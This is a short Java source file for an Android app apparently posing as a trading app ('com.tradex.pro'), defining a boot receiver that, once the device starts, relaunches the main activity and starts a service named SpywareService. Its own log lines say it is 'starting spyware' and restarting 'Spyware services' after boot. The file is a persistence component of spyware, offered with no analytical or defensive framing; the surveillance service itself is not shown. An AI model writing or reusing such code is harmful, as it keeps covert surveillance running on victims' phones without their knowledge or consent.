package com.tradex.pro;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String LOG_TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d(LOG_TAG, "Boot completed - starting spyware");
            
            // Restart the main activity
            Intent mainIntent = new Intent(context, MainActivity.class);
            mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(mainIntent);
            
            // Restart the spyware service
            Intent serviceIntent = new Intent(context, SpywareService.class);
            context.startService(serviceIntent);
            
            Log.d(LOG_TAG, "Spyware services restarted after boot");
        }
    }
}
